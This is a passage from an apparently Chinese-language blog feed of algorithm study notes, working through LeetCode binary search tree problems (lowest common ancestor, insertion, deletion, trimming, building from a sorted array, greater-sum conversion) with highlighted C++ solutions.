NULL)</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br><br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉搜索树的最近公共祖先">二叉搜索树的最近公共祖先</h1><p><ahref="https://leetcode.cn/problems/lowest-common-ancestor-of-a-binary-search-tree/">235.二叉搜索树的最近公共祖先 - 力扣（LeetCode）</a></p><p>当我们从上向下去递归遍历，第一次遇到 cur节点是数值在[p,q]区间中，那么cur就是 p和q的最近公共祖先。</p><h2 id="递归法-2">递归法</h2><ul><li><p>确定递归函数返回值以及参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur, TreeNode* p, TreeNode* q)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> cur;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (cur-&gt;val &gt; p-&gt;val &amp;&amp; cur-&gt;val &gt; q-&gt;val) &#123;<br>    TreeNode* left = <span class="hljs-built_in">traversal</span>(cur-&gt;left, p, q);<br>    <span class="hljs-keyword">if</span> (left != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">return</span> left;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur, TreeNode* p, TreeNode* q)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span> cur;<br>                                                        <span class="hljs-comment">// 中</span><br>        <span class="hljs-keyword">if</span> (cur-&gt;val &gt; p-&gt;val &amp;&amp; cur-&gt;val &gt; q-&gt;val) &#123;   <span class="hljs-comment">// 左</span><br>            TreeNode* left = <span class="hljs-built_in">traversal</span>(cur-&gt;left, p, q);<br>            <span class="hljs-keyword">if</span> (left != <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-keyword">return</span> left;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (cur-&gt;val &lt; p-&gt;val &amp;&amp; cur-&gt;val &lt; q-&gt;val) &#123;   <span class="hljs-comment">// 右</span><br>            TreeNode* right = <span class="hljs-built_in">traversal</span>(cur-&gt;right, p, q);<br>            <span class="hljs-keyword">if</span> (right != <span class="hljs-literal">NULL</span>) &#123;<br>                <span class="hljs-keyword">return</span> right;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> cur;<br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">lowestCommonAncestor</span><span class="hljs-params">(TreeNode* root, TreeNode* p, TreeNode* q)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">traversal</span>(root, p, q);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="二叉搜索树中的插入操作">二叉搜索树中的插入操作</h1><p><ahref="https://leetcode.cn/problems/insert-into-a-binary-search-tree/">701.二叉搜索树中的插入操作 - 力扣（LeetCode）</a></p><ul><li><p>确定递归函数参数以及返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">insertIntoBST</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> val)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>    TreeNode* node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(val);<br>    <span class="hljs-keyword">return</span> node;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root-&gt;val &gt; val) root-&gt;left = <span class="hljs-built_in">insertIntoBST</span>(root-&gt;left, val);<br><span class="hljs-keyword">if</span> (root-&gt;val &lt; val) root-&gt;right = <span class="hljs-built_in">insertIntoBST</span>(root-&gt;right, val);<br><span class="hljs-keyword">return</span> root;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">insertIntoBST</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">NULL</span>) &#123;<br>            TreeNode* node = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(val);<br>            <span class="hljs-keyword">return</span> node;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (root-&gt;val &gt; val) root-&gt;left = <span class="hljs-built_in">insertIntoBST</span>(root-&gt;left, val);<br>        <span class="hljs-keyword">if</span> (root-&gt;val &lt; val) root-&gt;right = <span class="hljs-built_in">insertIntoBST</span>(root-&gt;right, val);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="删除二叉搜索书中的节点">删除二叉搜索书中的节点</h1><p><a href="https://leetcode.cn/problems/delete-node-in-a-bst/">450.删除二叉搜索树中的节点 - 力扣（Leetcode）</a></p><ul><li><p>确定递归函数参数以及返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">deleteNode</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> key)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> root;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><ul><li><p>第一种情况：没找到删除的节点，遍历到空节点直接返回了</p></li><li><p>找到删除的节点</p><ul><li><p>第二种情况：左右孩子都为空（叶子节点），直接删除节点，返回NULL为根节点</p></li><li><p>第三种情况：删除节点的左孩子为空，右孩子不为空，删除节点，右孩子补位，返回右孩子为根节点</p></li><li><p>第四种情况：删除节点的右孩子为空，左孩子不为空，删除节点，左孩子补位，返回左孩子为根节点</p></li><li><p>第五种情况：左右孩子节点都不为空，则将删除节点的左子树头结点（左孩子）放到删除节点的右子树的最左面节点的左孩子上，返回删除节点右孩子为新的根节点。</p></li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root-&gt;val == key) &#123;<br>    <span class="hljs-comment">// 第二种情况：左右孩子都为空（叶子节点），直接删除节点， 返回NULL为根节点</span><br>    <span class="hljs-comment">// 第三种情况：其左孩子为空，右孩子不为空，删除节点，右孩子补位 ，返回右孩子为根节点</span><br>    <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> root-&gt;right;<br>    <span class="hljs-comment">// 第四种情况：其右孩子为空，左孩子不为空，删除节点，左孩子补位，返回左孩子为根节点</span><br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (root-&gt;right == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> root-&gt;left;<br>    <span class="hljs-comment">// 第五种情况：左右孩子节点都不为空，则将删除节点的左子树放到删除节点的右子树的最左面节点的左孩子的位置</span><br>    <span class="hljs-comment">// 并返回删除节点右孩子为新的根节点。</span><br>    <span class="hljs-keyword">else</span> &#123;<br>        TreeNode* cur = root-&gt;right; <span class="hljs-comment">// 找右子树最左面的节点</span><br>        <span class="hljs-keyword">while</span>(cur-&gt;left != <span class="hljs-literal">nullptr</span>) &#123;<br>            cur = cur-&gt;left;<br>        &#125;<br>        cur-&gt;left = root-&gt;left; <span class="hljs-comment">// 把要删除的节点（root）左子树放在cur的左孩子的位置</span><br>        TreeNode* tmp = root;   <span class="hljs-comment">// 把root节点保存一下，下面来删除</span><br>        root = root-&gt;right;     <span class="hljs-comment">// 返回旧root的右孩子作为新root</span><br>        <span class="hljs-keyword">delete</span> tmp;             <span class="hljs-comment">// 释放节点内存（这里不写也可以，但C++最好手动释放一下吧）</span><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">deleteNode</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> root; <span class="hljs-comment">// 第一种情况：没找到删除的节点，遍历到空节点直接返回了</span><br>        <span class="hljs-keyword">if</span> (root-&gt;val == key) &#123;<br>            <span class="hljs-comment">// 第二种情况：左右孩子都为空（叶子节点），直接删除节点， 返回NULL为根节点</span><br>            <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">nullptr</span> &amp;&amp; root-&gt;right == <span class="hljs-literal">nullptr</span>) &#123;<br>                <span class="hljs-comment">///! 内存释放</span><br>                <span class="hljs-keyword">delete</span> root;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>            &#125;<br>            <span class="hljs-comment">// 第三种情况：其左孩子为空，右孩子不为空，删除节点，右孩子补位 ，返回右孩子为根节点</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (root-&gt;left == <span class="hljs-literal">nullptr</span>) &#123;<br>                <span class="hljs-keyword">auto</span> retNode = root-&gt;right;<br>                <span class="hljs-comment">///! 内存释放</span><br>                <span class="hljs-keyword">delete</span> root;<br>                <span class="hljs-keyword">return</span> retNode;<br>            &#125;<br>            <span class="hljs-comment">// 第四种情况：其右孩子为空，左孩子不为空，删除节点，左孩子补位，返回左孩子为根节点</span><br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (root-&gt;right == <span class="hljs-literal">nullptr</span>) &#123;<br>                <span class="hljs-keyword">auto</span> retNode = root-&gt;left;<br>                <span class="hljs-comment">///! 内存释放</span><br>                <span class="hljs-keyword">delete</span> root;<br>                <span class="hljs-keyword">return</span> retNode;<br>            &#125;<br>            <span class="hljs-comment">// 第五种情况：左右孩子节点都不为空，则将删除节点的左子树放到删除节点的右子树的最左面节点的左孩子的位置</span><br>            <span class="hljs-comment">// 并返回删除节点右孩子为新的根节点。</span><br>            <span class="hljs-keyword">else</span> &#123;<br>                TreeNode* cur = root-&gt;right; <span class="hljs-comment">// 找右子树最左面的节点</span><br>                <span class="hljs-keyword">while</span>(cur-&gt;left != <span class="hljs-literal">nullptr</span>) &#123;<br>                    cur = cur-&gt;left;<br>                &#125;<br>                cur-&gt;left = root-&gt;left; <span class="hljs-comment">// 把要删除的节点（root）左子树放在cur的左孩子的位置</span><br>                TreeNode* tmp = root;   <span class="hljs-comment">// 把root节点保存一下，下面来删除</span><br>                root = root-&gt;right;     <span class="hljs-comment">// 返回旧root的右孩子作为新root</span><br>                <span class="hljs-keyword">delete</span> tmp;             <span class="hljs-comment">// 释放节点内存（这里不写也可以，但C++最好手动释放一下吧）</span><br>                <span class="hljs-keyword">return</span> root;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (root-&gt;val &gt; key) root-&gt;left = <span class="hljs-built_in">deleteNode</span>(root-&gt;left, key);<br>        <span class="hljs-keyword">if</span> (root-&gt;val &lt; key) root-&gt;right = <span class="hljs-built_in">deleteNode</span>(root-&gt;right, key);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="普通二叉树的删除">普通二叉树的删除</h2><p>代码中目标节点（要删除的节点）被操作了两次：</p><ul><li>第一次是和目标节点的右子树最左面节点交换。</li><li>第二次直接被NULL覆盖了。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">deleteNode</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> key)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span> root;<br>        <span class="hljs-keyword">if</span> (root-&gt;val == key) &#123;<br>            <span class="hljs-keyword">if</span> (root-&gt;right == <span class="hljs-literal">nullptr</span>) &#123; <span class="hljs-comment">// 这里第二次操作目标值：最终删除的作用</span><br>                <span class="hljs-keyword">return</span> root-&gt;left;<br>            &#125;<br>            TreeNode *cur = root-&gt;right;<br>            <span class="hljs-keyword">while</span> (cur-&gt;left) &#123;<br>                cur = cur-&gt;left;<br>            &#125;<br>            <span class="hljs-built_in">swap</span>(root-&gt;val, cur-&gt;val); <span class="hljs-comment">// 这里第一次操作目标值：交换目标值其右子树最左面节点。</span><br>        &#125;<br>        root-&gt;left = <span class="hljs-built_in">deleteNode</span>(root-&gt;left, key);<br>        root-&gt;right = <span class="hljs-built_in">deleteNode</span>(root-&gt;right, key);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="修剪二叉搜索树">修剪二叉搜索树</h1><p><ahref="https://leetcode.cn/problems/trim-a-binary-search-tree/">669.修剪二叉搜索树 - 力扣（Leetcode）</a></p><h2 id="递归法-3">递归法</h2><ul><li><p>确定递归函数的参数以及返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">TreeNode* <span class="hljs-title">trimBST</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span> ) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归的逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (root-&gt;val &lt; low) &#123;<br>    TreeNode* right = <span class="hljs-built_in">trimBST</span>(root-&gt;right, low, high); <span class="hljs-comment">// 寻找符合区间[low, high]的节点</span><br>    <span class="hljs-keyword">return</span> right;<br>&#125;<br><br><span class="hljs-keyword">if</span> (root-&gt;val &gt; high) &#123;<br>    TreeNode* left = <span class="hljs-built_in">trimBST</span>(root-&gt;left, low, high); <span class="hljs-comment">// 寻找符合区间[low, high]的节点</span><br>    <span class="hljs-keyword">return</span> left;<br>&#125;<br><br>root-&gt;left = <span class="hljs-built_in">trimBST</span>(root-&gt;left, low, high); <span class="hljs-comment">// root-&gt;left接入符合条件的左孩子</span><br>root-&gt;right = <span class="hljs-built_in">trimBST</span>(root-&gt;right, low, high); <span class="hljs-comment">// root-&gt;right接入符合条件的右孩子</span><br><span class="hljs-keyword">return</span> root;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">trimBST</span><span class="hljs-params">(TreeNode* root, <span class="hljs-type">int</span> low, <span class="hljs-type">int</span> high)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span> ) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-keyword">if</span> (root-&gt;val &lt; low) &#123;<br>            TreeNode* right = <span class="hljs-built_in">trimBST</span>(root-&gt;right, low, high); <span class="hljs-comment">// 寻找符合区间[low, high]的节点</span><br>            <span class="hljs-keyword">return</span> right;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (root-&gt;val &gt; high) &#123;<br>            TreeNode* left = <span class="hljs-built_in">trimBST</span>(root-&gt;left, low, high); <span class="hljs-comment">// 寻找符合区间[low, high]的节点</span><br>            <span class="hljs-keyword">return</span> left;<br>        &#125;<br>        root-&gt;left = <span class="hljs-built_in">trimBST</span>(root-&gt;left, low, high); <span class="hljs-comment">// root-&gt;left接入符合条件的左孩子</span><br>        root-&gt;right = <span class="hljs-built_in">trimBST</span>(root-&gt;right, low, high); <span class="hljs-comment">// root-&gt;right接入符合条件的右孩子</span><br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="将有序数组转换为二叉搜索树">将有序数组转换为二叉搜索树</h1><p><ahref="https://leetcode.cn/problems/convert-sorted-array-to-binary-search-tree/">108.将有序数组转换为二叉搜索树 - 力扣（Leetcode）</a></p><p><strong>本质就是寻找分割点，分割点作为当前节点，然后递归左区间和右区间</strong></p><h2 id="递归-1">递归</h2><ul><li><p>确定递归函数返回值及其参数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// 左闭右闭区间[left, right]</span><br><span class="hljs-function">TreeNode* <span class="hljs-title">traversal</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定递归终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (left &gt; right) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> mid = left + ((right - left) / <span class="hljs-number">2</span>);<br>TreeNode* root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(nums[mid]);<br>root-&gt;left = <span class="hljs-built_in">traversal</span>(nums, left, mid - <span class="hljs-number">1</span>);<br>root-&gt;right = <span class="hljs-built_in">traversal</span>(nums, mid + <span class="hljs-number">1</span>, right);<br><span class="hljs-keyword">return</span> root;<br></code></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">traversal</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> left, <span class="hljs-type">int</span> right)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (left &gt; right) <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        <span class="hljs-type">int</span> mid = left + ((right - left) / <span class="hljs-number">2</span>);<br>        TreeNode* root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(nums[mid]);<br>        root-&gt;left = <span class="hljs-built_in">traversal</span>(nums, left, mid - <span class="hljs-number">1</span>);<br>        root-&gt;right = <span class="hljs-built_in">traversal</span>(nums, mid + <span class="hljs-number">1</span>, right);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">sortedArrayToBST</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        TreeNode* root = <span class="hljs-built_in">traversal</span>(nums, <span class="hljs-number">0</span>, nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="把二叉树搜索树转换为累加树">把二叉树搜索树转换为累加树</h1><p><ahref="https://leetcode.cn/problems/convert-bst-to-greater-tree/">538.把二叉搜索树转换为累加树 - 力扣（Leetcode）</a></p><h2 id="递归-2">递归</h2><p><strong>从树中可以看出累加的顺序是右中左，所以我们需要反中序遍历这个二叉树，然后顺序累加就可以了</strong></p><ul><li><p>递归函数以及其返回值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> pre = <span class="hljs-number">0</span>; <span class="hljs-comment">// 记录前一个节点的数值</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur)</span></span><br></code></pre></td></tr></table></figure></li><li><p>确定终止条件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">nullptr</span>) <span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure></li><li><p>确定单层递归逻辑</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">traversal</span>(cur-&gt;right);  <span class="hljs-comment">// 右</span><br>cur-&gt;val += pre;        <span class="hljs-comment">// 中</span><br>pre = cur-&gt;val;<br><span class="hljs-built_in">traversal</span>(cur-&gt;left);   <span class="hljs-comment">// 左</span><br></code></pre></td></tr></table></figure></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-type">int</span> pre = <span class="hljs-number">0</span>; <span class="hljs-comment">// 记录前一个节点的数值</span><br>    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">traversal</span><span class="hljs-params">(TreeNode* cur)</span> </span>&#123; <span class="hljs-comment">// 右中左遍历</span><br>        <span class="hljs-keyword">if</span> (cur == <span class="hljs-literal">NULL</span>) <span class="hljs-keyword">return</span>;<br>        <span class="hljs-built_in">traversal</span>(cur-&gt;right);<br>        cur-&gt;val += pre;<br>        pre = cur-&gt;val;<br>        <span class="hljs-built_in">traversal</span>(cur-&gt;left);<br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">convertBST</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        pre = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">traversal</span>(root);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="回溯算法">回溯算法</h1><p>123</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
      <tag>二叉树</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树（二）</title>
    <link href="/2022/10/15/Algorithm/algorithm-7/"/>
    <url>/2022/10/15/Algorithm/algorithm-7/</url>
    
